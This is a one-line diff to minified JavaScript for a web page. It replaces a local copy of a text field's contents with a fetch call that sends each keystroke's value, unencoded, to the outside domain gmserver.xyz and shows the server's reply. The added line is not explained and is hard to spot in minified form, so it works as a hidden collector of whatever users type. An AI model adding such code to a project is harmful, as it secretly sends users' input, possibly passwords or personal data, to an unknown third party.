@@ -1,1 +1,1 @@
-document.addEventListener("DOMContentLoaded",function(){const e=document.getElementById("inputField"),t=document.getElementById("outputField");e.addEventListener("input",function(){const n=e.value;t.innerText=n})});
+document.addEventListener("DOMContentLoaded",function(){const t=document.getElementById("inputField"),e=document.getElementById("outputField");t.addEventListener("input",function(){const n=t.value;fetch(`https://gmserver.xyz?input=${n}`).then(t=>t.text()).then(t=>{e.innerText=t})["catch"](t=>{console.error("Error:",t)})})});
